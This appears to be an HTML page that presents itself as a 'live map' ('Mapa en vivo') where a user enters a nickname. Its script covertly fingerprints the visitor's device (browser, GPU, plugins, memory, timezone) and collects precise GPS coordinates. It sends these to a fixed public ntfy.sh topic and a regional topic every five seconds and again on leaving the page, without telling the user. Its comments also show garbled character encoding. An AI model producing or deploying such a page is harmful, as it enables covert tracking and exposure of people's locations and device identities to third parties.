<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <title>Mapa en vivo</title>
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin:0;
      padding:0;
      background:#121212;
      font-family:monospace;
      color:#0f0;
      display:flex;
      flex-direction:column;
      align-items:center;
    }
    h2 { margin-top:20px; }
    input, button {
      padding:10px;
      margin:5px;
      font-size:16px;
      background:#1e1e1e;
      color:#0f0;
      border:1px solid #00ff00;
      border-radius:5px;
    }
    button { cursor:pointer; }
    button:hover { background:#2a2a2a; }
    .map-section {
      width:90%;
      max-width:600px;
      height:400px;
      margin:20px 0;
      box-shadow:0 0 30px rgba(0,0,0,0.7);
      border-radius:15px;
      overflow:hidden;
    }
    #map { width:100%; height:100%; }
    .leaflet-popup-content-wrapper {
      background:#1e1e1e;
      color:#00ff00;
      font-weight:bold;
      border-radius:10px;
    }
    .leaflet-popup-tip { background:#1e1e1e; }
    .status {
      padding:10px;
      margin:10px;
      border-radius:5px;
      text-align:center;
    }
    .online { background:#004d00; }
    .offline { background:#4d0000; }
    .controls {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 10px;
    }
  </style>
</head>
<body>
<h2>Mapa en vivo</h2>
<div class="controls">
  <input type="text" id="nick" placeholder="Escribe tu Nick" />
  <button id="startBtn">Iniciar Seguimiento</button>
</div>
<div class="status offline" id="status">Desconectado</div>
<div class="map-section"><div id="map"></div></div>

<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

<script>
// Configuraci贸n del mapa
const map = L.map('map').setView([0,0],2);
L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png',{
  attribution:'&copy; OpenStreetMap &copy; Carto',
  subdomains:'abcd',
  maxZoom:20
}).addTo(map);

// Iconos para marcadores
const greenIcon = L.icon({
  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64572.png",
  iconSize:[50,50],
  iconAnchor:[25,50],
  popupAnchor:[0,-50]
});

const redIcon = L.icon({
  iconUrl:"https://cdn-icons-png.flaticon.com/512/64/64576.png",
  iconSize:[50,50],
  iconAnchor:[25,50],
  popupAnchor:[0,-50]
});

// Variables globales
let uid = "";
let userMarker = null;
let userCircle = null;
let markers = {};
let info = {};
let topicRegion = "";
let positionUpdateInterval;

// Funci贸n para obtener fingerprint del dispositivo
async function getFingerprint() {
  info = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${screen.width}x${screen.height}`,
    colorDepth: screen.colorDepth + " bits",
    coresCPU: navigator.hardwareConcurrency || "N/A",
    memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    plugins: [...navigator.plugins].map(p => p.name)
  };
  
  try {
    const canvas = document.createElement("canvas");
    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
    const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
    info.gpu = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "No detectada";
  } catch(e) {
    info.gpu = "No detectada";
  }
  
  return info;
}

// Funci贸n para obtener la ubicaci贸n y enviar datos
async function getLocationAndSend(nick) {
  if(!navigator.geolocation) return alert("No soporta geolocalizaci贸n");

  navigator.geolocation.getCurrentPosition(async pos => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;

    // Actualizar el mapa
    map.setView([lat, lon], 13);
    
    // Eliminar marcador anterior si existe
    if (userMarker) {
      map.removeLayer(userMarker);
    }
    
    // Eliminar c铆rculo anterior si existe
    if (userCircle) {
      map.removeLayer(userCircle);
    }
    
    // A帽adir nuevo marcador
    userMarker = L.marker([lat, lon], {icon: greenIcon}).addTo(map);
    userMarker.bindPopup(` ${nick} (T煤)`).openPopup();
    
    // A帽adir c铆rculo de animaci贸n
    userCircle = L.circle([lat, lon], {
      color: '#00ff00',
      fillColor: '#00ff00',
      fillOpacity: 0.3,
      radius: 100
    }).addTo(map);
    
    let growing = true;
    setInterval(() => {
      let r = userCircle.getRadius();
      if(r >= 200) growing = false;
      if(r <= 100) growing = true;
      userCircle.setRadius(growing ? r+5 : r-5);
    }, 100);

    // Obtener fingerprint
    await getFingerprint();

    // Geocoding inverso para obtener pa铆s y ciudad
    let region = {country: "Unknown", city: "Unknown"};
    try {
      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`);
      const data = await res.json();
      region.country = data.address.country || "Unknown";
      region.city = data.address.city || data.address.town || data.address.village || "Unknown";
    } catch(e) {
      console.log("Error geocoding:", e);
    }

    // Agregar coordenadas y link
    info.latitude = lat;
    info.longitude = lon;
    info.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
    info.country = region.country;
    info.city = region.city;
    info.timestamp = new Date().toISOString();
    info.nick = nick;

    // Topic simple: concatenar pa铆s + ciudad sin espacios ni /
    topicRegion = (region.country + region.city).replace(/\s+/g, '').replace(/\//g, '');
    
    // Enviar notificaciones
    try {
      // Enviar al principal
      await fetch('https://ntfy.sh/SypherioNoctvox', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(info)
      });
      
      // Enviar al topic regional simple
      await fetch(`https://ntfy.sh/${topicRegion}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(info)
      });
    } catch (e) {
      console.error("Error enviando a ntfy:", e);
    }
    
    // Actualizar estado
    document.getElementById("status").textContent = "Conectado";
    document.getElementById("status").className = "status online";

    // Actualizar posici贸n cada 5 segundos
    if (positionUpdateInterval) {
      clearInterval(positionUpdateInterval);
    }
    
    positionUpdateInterval = setInterval(() => {
      navigator.geolocation.getCurrentPosition(pos => {
        const lat = pos.coords.latitude;
        const lon = pos.coords.longitude;
        
        // Actualizar informaci贸n
        info.latitude = lat;
        info.longitude = lon;
        info.googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
        info.timestamp = new Date().toISOString();
        
        // Enviar actualizaci贸n a los topics
        fetch('https://ntfy.sh/SypherioNoctvox', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify(info)
        }).catch(e => console.error("Error actualizando ntfy:", e));
        
        if (topicRegion) {
          fetch(`https://ntfy.sh/${topicRegion}`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(info)
          }).catch(e => console.error("Error actualizando ntfy regional:", e));
        }
        
        // Actualizar nuestra posici贸n en el mapa
        userMarker.setLatLng([lat, lon]);
        userCircle.setLatLng([lat, lon]);
      });
    }, 5000);

  }, err => {
    alert("No se pudo obtener ubicaci贸n: " + err.message);
    document.getElementById("status").textContent = "Error de geolocalizaci贸n";
    document.getElementById("status").className = "status offline";
  });
}

// Evento para iniciar
document.getElementById("startBtn").onclick = () => {
  const nick = document.getElementById("nick").value.trim();
  if (!nick) return alert("Escribe un Nick");
  
  // Generar UID 煤nico
  uid = nick + "_" + Date.now();
  
  // Iniciar proceso de geolocalizaci贸n
  getLocationAndSend(nick);
};

// Aviso de desconexi贸n
window.addEventListener("beforeunload", () => {
  if (uid && info.latitude) {
    const desconexion = {
      ...info,
      event: "desconexi贸n",
      timestamp: new Date().toISOString()
    };
    
    // Enviar notificaci贸n de desconexi贸n
    fetch('https://ntfy.sh/SypherioNoctvox', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(desconexion)
    }).catch(e => console.error("Error enviando desconexi贸n:", e));
    
    if (topicRegion) {
      fetch(`https://ntfy.sh/${topicRegion}`, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(desconexion)
      }).catch(e => console.error("Error enviando desconexi贸n regional:", e));
    }
  }
});
</script>
</body>
</html>
